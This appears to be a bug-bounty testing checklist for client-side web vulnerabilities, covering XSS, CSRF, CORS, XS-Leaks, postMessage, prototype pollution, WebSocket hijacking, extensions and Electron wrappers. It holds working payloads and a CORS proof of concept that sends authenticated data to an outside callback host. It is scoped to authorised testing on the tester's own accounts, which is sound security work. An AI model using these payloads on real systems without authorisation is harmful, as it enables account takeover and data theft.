# Client-side

Proof standard for script execution: `alert(document.domain)` (shows the origin) or `print()` where `alert` is blocked. For a higher payout, demonstrate the impact chain against your own B account (token read, email change, a privileged action).

Tiers: **L1** finds the sink with canonical payloads. **L2** gets past filters, CSP, and framework defaults. **L3** uses parser differentials, gadgets, and browser behaviour to reach impact where script is blocked or the obvious path is closed.

**Half of this file needs an origin that is not the target** — CSRF, CORS, XS-Leaks,
postMessage, clickjacking, CSPT→CSRF, open redirect and CSWSH all put a page somewhere
else and let the victim's browser carry the cookies. That is `poc_serve.py`:

    poc_serve.py serve --engagement $P --dir poc          # loopback, records every hit
    browser.py nav --engagement $P --match <tab> --url http://127.0.0.1:8777/csrf.html

It binds loopback (a public bind needs the operator), serves a docroot plus canned routes
for the cases a file cannot cover (`--route '/r=302;location=…'` for a redirect the target
will follow, `--route '/jwks=200;…'` for `jku`), and logs every inbound request — that log
*is* the proof the PoC fired. `browser.py nav` will load that one origin and no other
off-scope host. A target WebSocket is `ws.py`, which speaks to the server directly and can
send an arbitrary `Origin`, so the CSWSH handshake question is one command.

---

## XSS

**L1 — Basic**
- [ ] **Reflected:** every parameter in `urls.all.txt`, error pages, search, 404 paths.
- [ ] **Stored:** profile fields, display names, org names, comments, file names, support tickets.
- [ ] Context payloads:
  ```
  HTML body            <svg onload=alert(document.domain)>
                       <img src=x onerror=alert(document.domain)>
  Attribute (quoted)   " autofocus onfocus=alert(document.domain) x="
  Attribute (href/src) javascript:alert(document.domain)
  JS string            '-alert(document.domain)-'      \';alert(document.domain)//
  Inside <script>      </script><svg onload=alert(document.domain)>
  ```

**Map the filter before choosing a payload.** Four questions, in order, and each answer
narrows the next: (1) does a plain, harmless tag survive at all — `<h1>x</h1>` — and does
it reach the DOM as markup or as text? (2) what does the app do to each form of the
dangerous characters: `<`, `&lt;`, `%3C`, `%253C`, `%26lt;` — which does it decode, where,
and how many times? (3) which family does the block belong to — a character strip, a tag
allowlist, an event-handler denylist, an encoder? (4) only now, which payload fits the
**output context** it actually lands in. Jumping to a payload catalogue answers none of
these, and a block tells you nothing about which of the four it came from. Write the answers
into `filters.md` with the siblings that lack the same control — the asymmetries are the
exploitable part: `"` encoded while `'` is not (or the reverse) breaks out of a quoted
attribute, and a parameter *name* reflected raw while its value is encoded gives you
`<base href>` to re-root every relative script on the page.

**L2 — Intermediate**
- [ ] Parameters the UI never sends (Param Miner) — reflected without the front end's encoding.
- [ ] Stored in richer sinks: markdown/rich text, uploaded SVG/HTML, email templates, webhook payloads shown in the UI.
- [ ] **DOM XSS** with Burp **DOM Invader**. Sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` data, `localStorage`. Sinks: `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout(string)`, `Function()`, `location =`, `src`/`href` assignment, jQuery `.html()`/`$(user)`, React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrustHtml`.
- [ ] More contexts:
  ```
  Template literal     ${alert(document.domain)}
  Markdown             [x](javascript:alert(document.domain))   ![x](x"onerror="alert(document.domain))
  AngularJS (1.x)      {{constructor.constructor('alert(document.domain)')()}}
  ```
- [ ] Filter evasion: mixed case, `<svg/onload=…>`, HTML entity encoding inside attributes, `&#x6a;avascript:`, unusual events (`onpointerenter`, `onanimationstart` with an injected `<style>`), double URL encoding where the app decodes twice.
- [ ] **Blind XSS:** a payload that loads a script from your own callback server and reports `document.domain`, the URL, and a DOM snapshot. Put it in fields that staff will view.
- [ ] **CSP:** read the `Content-Security-Policy` header. Weaknesses: `unsafe-inline`, `unsafe-eval`, `data:` in `script-src`, missing `object-src`.
- [ ] **Impact upgrades:**
  - Read a non-`HttpOnly` token from `localStorage`/cookies.
  - `fetch` an authenticated page, read the CSRF token, then change B's email or add your MFA device → ATO.
  - Stored XSS rendered to admins → privilege escalation.

**L3 — Advanced**
- [ ] **mXSS / sanitizer bypass:** if DOMPurify or a server-side sanitizer is in use, check its version for known bypasses; test namespace confusion (`<svg><style>`, `<math><mtext><table><mglyph><style>`) — markup the sanitizer and the browser parse differently.
- [ ] **CSP bypass:** allowed hosts that serve JSONP or old AngularJS (`*.googleapis.com`, `cdnjs.cloudflare.com`) as script gadgets; missing `base-uri` (inject `<base href>` to re-root relative scripts); nonce reuse across responses; nonce exposed to injected markup.
- [ ] **DOM clobbering** where HTML survives sanitisation but script does not: `<a id=config href="//OAST/x.js">`, `<form id=x><input name=y>`, two `<a id=x>` plus `name=y` overwrite globals the app reads (`window.config.url`, `x.y`). DOMPurify keeps `id`/`name` by default; its `SANITIZE_DOM` only blocks names that collide with built-in DOM properties, and `SANITIZE_NAMED_PROPS` is off by default.
- [ ] Normalisation after sanitisation: full-width `＜svg onload=…＞` (U+FF1C/U+FF1E) becomes `<…>` when the app applies NFKC after filtering.
- [ ] **Dangling markup / CSS injection** when script is blocked but HTML or CSS injection works: an unclosed attribute or tag swallows the markup after it, up to the next matching quote or closing tag, and sends it to you — CSRF tokens, email addresses, anything rendered later in the page. Attribute selectors in CSS leak token characters the same way.
  - Chromium refuses URLs that contain a raw newline together with `<`, so `<img src='https://OAST/?` usually fails there over multi-line markup. A form survives it, because submission percent-encodes what it captured: `<form action=https://OAST/><button>x</button><textarea name=d>` swallows the markup up to `</textarea>` (one click from B). `<base target='` moves the captured markup into the `window.name` of the next window a link opens; browsers have been adding mitigations for that one, so confirm it in the browser you report against.
  - CSP: a strict `img-src`/`default-src` blocks the resource variants and `form-action` blocks the form; read the policy before choosing the sink.
  - Proof: a CSRF token or email from B's own page in your OAST log, then what that token buys (a CSRF on B).
- [ ] **CSS-only exfiltration** when only `<style>` survives: recursive `@import` chaining (each response serves the next round of attribute selectors, one character per round), or `@font-face` with `unicode-range` to learn which characters a text node contains. Prove on a token in B's own page and recover a few characters.

## Client-side template injection and script gadgets
HTML injection that survives a sanitizer, or text reflected into markup a client framework compiles, becomes script through the framework itself. Reference: Lekies et al., *Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets* (CCS 2017).

**L1 — Basic**
- [ ] `{{7*7}}` in every reflected and stored value. `49` in the rendered DOM (DevTools → Elements), not in the raw response, means a client-side template compiled it. Find the framework that owns that part of the DOM: AngularJS `ng-app`, Vue mounted on server-rendered markup, Alpine.js `x-data`.

**L2 — Intermediate**
- [ ] Expression payloads per framework and version — the PortSwigger XSS cheat sheet keeps them for each AngularJS sandbox version and for Vue 2 and 3. Start from `{{constructor.constructor('alert(document.domain)')()}}`.
- [ ] Attribute-driven frameworks where HTML injection keeps attributes: Alpine.js (`x-init`, `x-html`), htmx (`hx-get` with `hx-trigger="load"`, `hx-on:*`), Knockout (`data-bind`), AngularJS (`ng-*`). DOMPurify keeps `data-*` attributes by default (`ALLOW_DATA_ATTR`), and htmx also reads `data-hx-*`.

**L3 — Advanced**
- [ ] Nonce-based and `strict-dynamic` CSPs: a trusted script that builds scripts from DOM data runs your markup — RequireJS `data-main`, jQuery `.html()` or `$()` given a `<script>`, loaders that read `data-src`. The Script Gadgets paper lists them per library.
- [ ] Server-side sanitizers written for plain HTML (per-tag attribute allowlists, or "strip `on*` only") pass framework directives straight through.
- [ ] Proof: `alert(document.domain)` through the framework, with the page's CSP in the evidence.

## CSRF
For every state-changing request that authenticates with cookies:

**L1 — Basic**
- [ ] Remove the token; send an empty token.
- [ ] Method switch: `POST` → `GET` with the same parameters.

**L2 — Intermediate**
- [ ] Send another user's token; a token from a different session (token not bound to the session).
- [ ] Content-type switch: `application/json` → `text/plain` with a JSON-shaped body (a simple request, no preflight), or → `application/x-www-form-urlencoded`.
- [ ] `SameSite`: cookies set without an explicit `SameSite` attribute default to `Lax` in Chrome, which still sends them on top-level `GET` navigations — and, for cookies younger than 2 minutes, on top-level `POST` too. Cookies explicitly set to `SameSite=None` are fully exposed.
- [ ] Referer/Origin check only when the header is present → suppress it with `<meta name="referrer" content="no-referrer">`.
- [ ] Login CSRF (log B into A's account) — matters only with a proven consequence: it chains with self-XSS, or B then enters private data that A reads, makes a purchase, or links a credential (`reporting.md` → Gate 5).

PoC skeleton:
```html
<form action="https://app.target.com/api/account/email" method="POST" enctype="text/plain">
  <input name='{"email":"a@x.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

**L3 — Advanced**
- [ ] `SameSite=Lax` bypass via method override: some frameworks honour `_method=POST` on a `GET` request, which Lax cookies accompany.
- [ ] `SameSite=Strict` bypass via an on-site gadget: a client-side redirect on the target (`/redirect?to=/api/...`) makes the follow-up request same-site.
- [ ] **Same-site is not same-origin:** XSS or a takeover on any sibling subdomain of the registrable domain bypasses `SameSite` entirely.
- [ ] Cookie refresh: trigger a fresh session cookie (e.g. an SSO re-login in a popup) to open the 2-minute Lax-POST window on an otherwise protected endpoint.
- [ ] Double-submit / token tied to a non-session cookie: inject that cookie (CRLF, cookie tossing from a sibling subdomain) and send a matching token.

## Client-side path traversal (CSPT)
The front end builds an API path from input it does not own (`fetch('/api/items/' + params.get('id'))`, a route segment, a hash value). A `../` in that input sends the app's own request — same origin, with its cookies, auth header and CSRF token attached — to a different endpoint. The changed path alone is not a finding; the sink is: CSRF on a state-changing endpoint, XSS from a response you shape, or a leak.

**L1 — Basic**
- [ ] Find the sources: route segments and query/hash values that reach `fetch`/`axios`/`XMLHttpRequest` URLs (grep bundles for template literals and string concatenation into API paths; compare page-URL values with request paths in Burp history).
- [ ] Put `..%2f` or `../` into each one on a read-only page load with your own account and watch DevTools → Network: does the outgoing API path change?

**L2 — Intermediate**
- [ ] **CSPT → CSRF:** note what the sink request carries — method, body, and the headers the app adds (bearer token, `X-CSRF-Token`). Find a state-changing endpoint with the same method that the traversal reaches; a `GET` sink matters for CSRF only if some `GET` changes state. The request is the app's own, so CSRF tokens and `SameSite` do not stop it. Prove on B: B opens your link and B's own reversible setting changes.
- [ ] When `../` is filtered or normalised by the router: `%2e%2e%2f`, `..%252f` where the app decodes twice, `..\` / `%5c`; `%3f` or `%23` to cut off the rest of the path the app appends.
- [ ] Sources beyond the URL: `localStorage`, `postMessage` data, and API responses (stored CSPT — an object name or ID A saves that B's client later puts into a path).

**L3 — Advanced**
- [ ] **CSPT → XSS / data injection:** point the fetch at a same-origin response whose content you control — an uploaded file served as JSON, an object field returned raw, a redirect the fetch follows — and trace which response fields reach an HTML sink or drive further requests.
- [ ] Mobile and desktop clients (React Native, Electron) that build API paths the same way; their HTTP stack may not normalise `../` the way a browser does.
- [ ] Background: Doyensec's CSPT2CSRF research (Maxence Schmitt, 2024) and their Burp extension for listing CSPT sources and sinks.

## CORS
**L1 — Basic**
```
Origin: https://evil.com                → ACAO reflects it + Access-Control-Allow-Credentials: true
```

**L2 — Intermediate**
```
Origin: null                            → ACAO: null + credentials (sandboxed iframe sends null)
Origin: https://target.com.evil.com     → suffix/prefix regex flaw
Origin: https://eviltarget.com          → unanchored match
```

**L3 — Advanced**
```
Origin: https://wwwXtarget.com          → unescaped regex dot in "www.target.com"
Origin: https://sub.target.com          → trusted subdomain (chain with XSS or takeover on it)
```

A finding needs credentials allowed **and** a response with sensitive data. Don't spend sweep time on CORS for its own sake: note a reflected origin and move on unless an endpoint behind it returns secrets or tokens, or a stored-content/XSS finding on a trusted origin gives you the reading page. PoC:
```html
<script>
fetch('https://api.target.com/me', {credentials: 'include'})
  .then(r => r.text()).then(t => fetch('https://OAST/?d=' + encodeURIComponent(t)));
</script>
```

## XS-Leaks
A page on another origin learns something about B's state on the target without reading any response — from what the browser exposes about it: how many frames it has, whether a resource loaded or errored, whether it redirected, how long it took. Reference: xsleaks.dev.

What pays: an oracle that extracts private content (XS-Search over B's data) or ties a visitor to an identity. "Is the visitor logged in" or "does this account exist" alone is the enumeration class under *Usually not paid*.

**L2 — Intermediate**
- [ ] Preconditions per candidate endpoint: are B's cookies sent on the cross-site request the oracle needs? Subresources and iframes need `SameSite=None`; `Lax` cookies still go with top-level navigations, including `window.open`. Note `Cross-Origin-Opener-Policy` (severs the `window.open` reference), `frame-ancestors`/`X-Frame-Options`, CORP, and Fetch Metadata checks that reject `Sec-Fetch-Site: cross-site`.
- [ ] A state-dependent difference on an endpoint whose answer is private: status code (`onload`/`onerror` on `<script>`, `<img>`, `<link>`), frame count (`w.length` on a `window.open` handle), a redirect or not, a download or not, a `postMessage` sent or not.
- [ ] Confirm the oracle on two of your own states (B with and without the private item) before building on it.
- [ ] Run the probing page from an origin you control locally: `poc_serve.py serve --engagement $P --dir poc` binds loopback, records every hit as the evidence the probe fired, and is the one origin `browser.py nav` may load besides the target. It is cross-site to the target, and B is your own browser. A publicly hosted PoC page needs operator approval (`--bind` refuses without it).

**L3 — Advanced**
- [ ] **XS-Search:** a search or filter over B's private data whose result and no-result pages differ in one of the observables above → recover a value prefix by prefix. Prove on a marker you planted in B's data and recover only a few characters — enough to show the rate.
- [ ] Observables beyond status and frame count, each with its own preconditions:

  | Oracle | Learns | Closed by |
  |---|---|---|
  | `onload`/`onerror` on `<script>`, `<link rel=stylesheet>`, `<object>` | Status, or whether the response parses as script/stylesheet | CORP, Fetch Metadata checks, `SameSite` |
  | Frame count (`w.length`) | How many iframes B's view of the page has | COOP (`window.open`), `frame-ancestors` (iframes) |
  | ID attribute: iframe the page with `#<element-id>`, listen for `blur` on your page | Whether a focusable element with that ID exists | `frame-ancestors` / `X-Frame-Options` |
  | CSP violation: your page limits `frame-src`/`connect-src` to the target origin, then loads the URL | Whether it redirected to another origin | `SameSite` on the cookies |
  | Media properties (`naturalWidth`, `naturalHeight`, `duration`) | Which image or video B's session gets | CORP |
- [ ] Turn a one-bit oracle into data: a search, filter, or count page whose element IDs, frame count, or status depend on whether the query matched B's data → XS-Search above.
- [ ] Check the oracle in current Chrome, Firefox, and Safari; the report's impact covers only the browsers where it works.
- [ ] Timing when no other channel exists (`performance.now()` around a cross-site load, connection-pool timing): noisy, needs many repetitions, rarely meets the bar alone.
- [ ] Cache probing is largely closed by partitioned HTTP caches in current browsers; skip it without a specific reason.

## postMessage
**L1 — Basic**
- [ ] Find listeners: DevTools → Sources → Event Listener Breakpoints → `message`, or grep bundles for `addEventListener("message"` / `onmessage`.

**L2 — Intermediate**
- [ ] Missing origin check, or a weak one (`indexOf('target.com')`, `startsWith`, unescaped regex `.`), plus a dangerous sink → DOM XSS or token theft.
- [ ] Senders using `postMessage(data, '*')` with tokens → frame or `window.open` the page and receive them.
- [ ] Weak origin checks, by shape, with an origin that passes each:
  ```
  origin.indexOf('target.com') > -1          https://target.com.attacker.example
  origin.endsWith('target.com')              https://eviltarget.com
  origin.startsWith('https://target.com')    https://target.com.attacker.example
  /^https:\/\/www.target.com$/.test(origin)  https://wwwxtarget.com          (unescaped dot)
  origin.search('https://www.target.com')    a string treated as a regex: unescaped dots again
  ```
- [ ] Tooling: DOM Invader's postMessage view, or the postMessage-tracker extension (Frans Rosén), logs every listener and message while you use the app.

**L3 — Advanced**
- [ ] Origin check that accepts `null`: send from a sandboxed iframe (`<iframe sandbox="allow-scripts" srcdoc="…">`).
- [ ] Listener trusts `event.source` or a secret inside the message instead of `event.origin`.
- [ ] A leaky listener on an OAuth callback or error page is the token-theft gadget for dirty dancing (`vectors-auth.md`).
- [ ] **Relays and bridges:** SDK iframes (chat widgets, payments, SSO helpers) that forward messages between frames, or a parent that passes a trusted child's data into its own sinks. Trusting the child's origin does not make the data it relays trustworthy — map who forwards what to whom.
- [ ] **Senders that follow the opener:** a page that posts a token to `window.opener` or `parent` with `'*'` delivers it to whoever opened it. OAuth and SSO popups and "connect your account" flows are the usual senders: open the flow from your page with `window.open` and listen.
- [ ] Message data that reaches `fetch` URLs or bodies → CSPT (above), or a request that carries B's credentials.
- [ ] Proof: B's token, or a DOM XSS on the target origin, delivered from a page you control to your own B session.

## Prototype pollution (client)
**L2 — Intermediate**
```
?__proto__[h1poc]=1      #__proto__[h1poc]=1      ?constructor[prototype][h1poc]=1
```
Check `Object.prototype.h1poc` in the console. Pollution without a gadget is usually not paid.
- [ ] Sources beyond the query string: `location.hash` parsers, `postMessage` data merged into config, JSON read back from `localStorage`, query parsers (`deparam`, `jquery-deparam`, `qs` bundled for the browser), deep-merge helpers (`$.extend(true, …)`, old lodash `merge`/`defaultsDeep`).
- [ ] When `__proto__` is filtered: `constructor[prototype][h1poc]=1`, dot forms (`__proto__.h1poc=1`), and `__pro__proto__to__[h1poc]=1` against a filter that removes the word once.

**L3 — Advanced**
- [ ] Find a gadget (DOM Invader's gadget scan, `ppmap`): a library that reads an unset property into a sink (`innerHTML`, `src`, `jQuery` options, sanitizer config).
- [ ] Known gadgets by library: the `BlackFan/client-side-prototype-pollution` repository lists sources and gadgets for jQuery, Google Analytics and Tag Manager, Adobe DTM, Akamai Boomerang, Vue, and others — match them against the libraries and versions in your bundles.
- [ ] Config gadgets: options a library reads with defaults from a plain object — sanitizer allowlists, template delimiters, script-loader URLs. Polluting them changes what the sanitizer passes or what the loader fetches.
- [ ] Proof: `alert(document.domain)` through the gadget, on your own B session.
- [ ] Server-side pollution: `vectors-injection.md`.

## Open redirect
**L1 — Basic**
```
//OAST    https://OAST
```

**L2 — Intermediate**
```
/\OAST    https:OAST    /%2f%2fOAST    https://target.com@OAST
https://target.com.OAST    /redirect?url=https://OAST%23.target.com
```

**L3 — Advanced**
- [ ] DOM redirects (`location = params.get('next')`) → `javascript:` = DOM XSS.
- [ ] Parser and normalisation tricks: `https://OAST\@target.com` (backslash handled differently by server-side URL parsers and the browser), `https://target.com%E3%80%82OAST` (U+3002 ideographic full stop normalised to `.`).
- [ ] Redirects through `Refresh` headers and `<meta http-equiv="refresh">`.

Standalone it is often low or N/A; use it in the OAuth `redirect_uri` chain (`vectors-auth.md`) or for SSRF filter bypass.

## Clickjacking
**L2 — Intermediate**
- [ ] Only when a sensitive action completes in one or two clicks (delete account, grant OAuth access, change settings) and the page lacks `X-Frame-Options` and CSP `frame-ancestors`. PoC: an iframe at low opacity with a decoy button over the target button.

**L3 — Advanced**
- [ ] **DoubleClickjacking** (Yibelo, 2024): the attacker page asks for a double-click; between the two clicks the top-level window is navigated to the target's sensitive page, so the second click lands on its button. Framing defences do not apply because nothing is framed. Worth it only for one-click high-impact actions (OAuth consent, account linking).

## Cross-site WebSocket hijacking (CSWSH)
**L2 — Intermediate**
- [ ] The handshake authenticates with cookies and the server does not validate `Origin` → open the socket from your page and read B's messages. `ws.py --engagement $P --url wss://… --label B --origin https://evil.example` answers the handshake question in one connection without a page at all; use `poc_serve.py` when the proof needs a real cross-site browser context.
- [ ] Test every websocket message for IDOR, injection, and missing authorization; they are often checked less than the REST API.

**L3 — Advanced**
- [ ] Subscribe to B's channel/room/topic by name or ID after the handshake.
- [ ] **WebSocket smuggling** (0ang3el, 2019): some reverse proxies treat a connection as upgraded as soon as the client asks, without checking that the back end answered `101`.
  - Signal: send an upgrade the back end will refuse (an unsupported `Sec-WebSocket-Version`) to a websocket endpoint. A back-end `426` or `400` after which the connection stays open, where an ordinary error would close it, means the proxy now relays raw bytes both ways.
  - Variant: an endpoint whose status code you choose (a health check or URL-fetch feature that returns what an external server answers) can produce a real-looking `101`, which fools proxies that do check the status.
  - Proof: one request through the open connection to a path the proxy normally answers `403`, or that exists only internally. Same approval as `vectors-server.md` → HTTP request smuggling; stop at one response.
- [ ] Socket.IO and SockJS fall back to HTTP long-polling (`/socket.io/?EIO=4&transport=polling`): plain cookie-authenticated requests whose CORS and CSRF handling can differ from the upgrade's `Origin` check — test both transports.

## Cookie parsing and injection
Cookie tossing is in `vectors-auth.md` → Session management. These need script, or a header-injection primitive, on the target or a same-site origin; the cookie step is what turns that primitive into session theft or fixation on the main app.

**L2 — Intermediate**
- [ ] Cookie value injection: a server that sets a cookie from a parameter (`?lang=` → `Set-Cookie: lang=…`) or a CRLF in `Set-Cookie` (`vectors-injection.md`) — inject `; Domain=`, `; Path=`, or a second cookie.
- [ ] **Cookie jar overflow:** browsers cap the number of cookies per domain. Script that sets enough throwaway cookies evicts the oldest, including an `HttpOnly` session or CSRF cookie, then sets its own value under that name. Confirm the eviction in the browser you report against.

**L3 — Advanced**
- [ ] Parser differentials between browser, proxy, and app: quoted values (`a="x; b=y"`), legacy RFC 2109 `$Version`/`$Path` handling on some Java and Python servers, which of two same-name cookies wins, and `__Host-`/`__Secure-` prefixes the server does not match by exact name. Each lets an injected cookie shadow the real one.
- [ ] **Cookie sandwich** (Fedotkin, PortSwigger Research, 2025): on servers with legacy `$Version` parsing, a quoted cookie opened before the `HttpOnly` session cookie and closed after it makes the server read both as one value; an endpoint that reflects that cookie then hands the session to script. Prove with your own B session.
- [ ] Cookie bombing (oversized cookies that make every request fail) is availability-only: out.

## Service workers
A service worker sits between the network and every page in its scope, and stays registered after the tab closes. These checks find a worker the app ships badly, or turn a same-origin script primitive (an upload, a JSONP endpoint, an XSS) into control of a whole scope.

**L2 — Intermediate**
- [ ] Inventory: grep bundles for `serviceWorker.register(` and note each script URL and `scope`; DevTools → Application → Service workers on each host. Record them in `map.md`.
- [ ] **Registration from a script you influence.** Browsers register only a same-origin script served over HTTPS with a JavaScript MIME type, and its scope defaults to the script's directory. Candidates: an uploaded file the app origin serves as `text/javascript`, a JSONP or callback endpoint that echoes `callback=` into a script response, a `register()` or `importScripts()` URL taken from a query parameter, `postMessage`, or config. Registering needs script on the origin first, so report it as an impact upgrade of that bug (it survives reloads and covers every page in scope), not as a separate finding.
- [ ] **Scope widening:** a script under `/uploads/` controls only `/uploads/` unless its response carries `Service-Worker-Allowed: /` or another parent path. Note every endpoint that sends it.
- [ ] Logout and account switch: authenticated responses left in Cache Storage, or served by the worker to the next account on the same browser (`Clear-Site-Data` missing on logout). Shared-device impact; usually low.

**L3 — Advanced**
- [ ] The worker's `fetch` handler: request paths or query values that reach `fetch()` (CSPT inside the worker, see *CSPT* above), and routes it answers from cache without asking the network.
- [ ] `importScripts()` or `import()` from a URL derived from `location`, a query parameter, or a config the app fetches — a gadget as in *Client-side template injection and script gadgets*, with persistence.
- [ ] Push handlers that put payload data into `showNotification` or open a URL from it: impact only if you can send pushes to B, which normally needs the server's keys.

**Proof:** in your own browser signed in as B, register a worker whose only behaviour is adding an `x-h1-<username>` header to responses it serves, show that it survives a reload, then unregister it and clear site data. Cleanup ledger row.

## Browser extensions (only when in scope)
Only when the program lists the extension as an asset (a Chrome Web Store or Firefox Add-ons ID). Download the package for the current store version, unzip it, and read the code. Test in a separate browser profile with only B signed in.

**L1 — Basic**
- [ ] `manifest.json`: `permissions` and `host_permissions` (broad host access is what makes the bugs below matter), `externally_connectable.matches` (web origins allowed to message the extension), `web_accessible_resources` (extension pages any site can load or frame), `content_scripts.matches`, and `content_security_policy` for extension pages.
- [ ] Keys, internal hosts, and debug flags in the bundle (`vectors-server.md` → Secrets rules apply).

**L2 — Intermediate**
- [ ] **Page → content script → background:** a content script that listens for `message` events on `window` and forwards the data to `chrome.runtime.sendMessage` without checking `event.origin` and `event.source`. Any page it runs on can then ask the background worker to act with the extension's privileges: fetch with its host permissions (cross-origin read of B's data on the target), read cookies or tabs, change settings. The origin-check bypasses in *postMessage* above apply.
- [ ] `runtime.onMessageExternal` handlers: every origin in `externally_connectable` can call them, including each subdomain a `*.target.com` match covers, so an XSS or takeover on any of them drives the extension.
- [ ] Extension pages (popup, options, side panel) that render page-supplied or synced data with `innerHTML`: script there runs with the extension's privileges.
- [ ] `web_accessible_resources` pages that act on load or trust URL parameters: framed from your page (*Clickjacking* above) or opened with values you choose.

**L3 — Advanced**
- [ ] Content-script DOM XSS: data from the page or the product's API written into the page with `innerHTML`. Event handlers in that markup run in the page's world, not the extension's; it matters when the data came from another user (a shared doc, a message) and the page is the target's.
- [ ] Token handling: the product's session or API token kept where pages can reach it (page `localStorage`, a DOM attribute, a message reply to any origin), or sent to every origin the extension runs on.
- [ ] Remote config: rules or feature flags fetched at runtime that steer what the extension does. MV3 forbids remotely hosted code, not remote config; MV2 extensions may still load remote scripts.

**Proof:** a local page (`poc_serve.py serve --engagement $P`) and B's profile; show B's data read, or an action taken as B, through the extension.

## Desktop application wrappers (only when in scope)

A `DOWNLOADABLE_EXECUTABLES` asset on a web product is usually **the web client in a
wrapper** — Electron, Tauri, CEF, or a WebView2/WKWebView shell. That makes it the most
valuable client on the program and routinely the least tested: the same pages and the same
API, with a native bridge behind them, so a bug that is XSS in the browser is *code
execution on the user's machine* here. It also falls between skills — this one tests the
web, `mobile-app-security` tests phones — so nobody opens it unless the asset census says
to (`SKILL.md` → Multi-surface engagements).

Where `desktop-app-security` is installed, it runs the whole client as a sub-engagement and
this section is the renderer-and-bridge half it hands back here; its `references/wrappers.md`
owns the desktop lifecycle (launch arguments, protocol-handler registration per OS,
second-instance handling, the update framework) and its per-OS files own everything the
operating system contributes. **A native desktop client is out of this section's scope
entirely** and belongs to that skill — without it, a native client's rows stay `partial` with
the gap named, never `n-a`.

**Identify it first** (nothing below applies to a native app):
- Electron: an `app.asar` or `app.asar.unpacked` in the install tree, a bundled
  `chrome_100_percent.pak`, `LICENSES.chromium.html`, `--remote-debugging-port` accepted.
- Tauri: a small binary plus a system WebView, `tauri.conf.json` baked in.
- CEF: `libcef.so`/`cef.dll` plus `cef.pak`.
- Read the version against the upstream advisories, but remember *"use of known-vulnerable
  library"* and third-party 0-day are excluded on many programs — the finding has to be
  reachable in **this** app's configuration.

**L1 — Basic**
- [ ] **Unpack and read the app's own code.** `npx @electron/asar extract app.asar out/`,
  then the same grep set as a JS bundle (`recon.md` §6): endpoints, hosts, secrets, feature
  flags, and the IPC channel names. This is the client's source, and it is the server's route
  list as well — feed it to `channel_diff.py` as a third corpus (`recon.md` §9b).
- [ ] **The custom protocol handler.** A desktop client almost always registers one
  (`myapp://`). Enumerate what it routes — the same job as an Android deep link — and ask the
  one question that matters: does a URL arriving from the *outside* (a web page, a document,
  a chat message) reach the same router as an internal navigation? This is the desktop twin
  of a client that lets the caller declare a navigation "internal".
- [ ] **Auto-update transport**: is the manifest and the package fetched over TLS, is the
  signature verified, and is the update host pinned to the vendor? Report the mechanism, not
  a MITM — "attacks requiring MITM" is excluded on most programs, so the finding is a
  *missing signature check* or an attacker-controllable update URL, proved from the config.

**L2 — Intermediate**
- [ ] **`nodeIntegration` / `contextIsolation` / `sandbox`** per `BrowserWindow` in the
  unpacked source. `nodeIntegration: true` with any content you can influence is RCE;
  `contextIsolation: false` means a renderer-side gadget reaches the preload's globals.
  Enumerate every window and `webview`/`BrowserView`, not just the main one — the login
  window and the in-app browser are frequently configured differently from the main one.
- [ ] **The preload bridge.** Whatever `contextBridge.exposeInMainWorld` publishes is the
  real attack surface: list every exposed method and ask of each whether it validates its
  arguments, and whether the renderer calling it could be an attacker's page. An exposed
  `invoke(channel, ...args)` that passes a *caller-chosen* channel through to `ipcMain` is a
  bridge with no allowlist at all.
- [ ] **`ipcMain` handlers** (`handle`/`on`): one row each — what it does, what it trusts,
  and whether the sender is checked (`event.senderFrame`). A handler that reads or writes a
  path, spawns a process, or returns a token is the one to prove first.
- [ ] **Navigation controls**: `will-navigate`, `setWindowOpenHandler`,
  `webContents.setWindowOpenHandler` returning `allow` for arbitrary URLs, and
  `shell.openExternal` reached with a `file:` or protocol-handler URL — the standard path
  from an in-app link to local execution.
- [ ] **The same input, the desktop sink.** Anything your web testing reflected — a display
  name, a document title, a filename, a message — gets re-rendered here. One sink is
  hardened (the one the developer looked at in the browser) and the wrapper's is often not.
  Seed markers through the web client and look for them in the desktop renderer.

**L3 — Advanced**
- [ ] A renderer with `contextIsolation: false` plus a prototype-pollution or DOM-clobbering
  gadget in the page: the gadget reaches `require` or the preload's globals.
- [ ] `--remote-debugging-port` or an `inspect` flag reachable from a protocol-handler
  argument, which hands any local process full control of the renderer.
- [ ] Deserialization or path handling in a native module the bridge calls, and archive
  extraction in an import feature (`vectors-server.md` → Archive extraction).

**Proof limits.** Prove on your own install, against your own B account. Stop at the first
proof of execution — a benign marker, `calc`/`id`, or an OAST hit — and never a payload that
persists past the window. The severity claim is "remote code execution on client app" only
when the trigger is genuinely remote (a link, a message, a document) and the user
interaction is realistic; a chain that needs an already-local process is a local finding.
